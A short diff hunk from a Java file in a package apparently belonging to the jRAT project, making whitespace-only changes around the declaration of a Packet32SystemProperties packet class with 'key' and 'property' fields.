@@ -4,9 +4,8 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet32SystemProperties extends AbstractOutgoingPacket {
-	
+
 	private String key;
 	private String property;
 
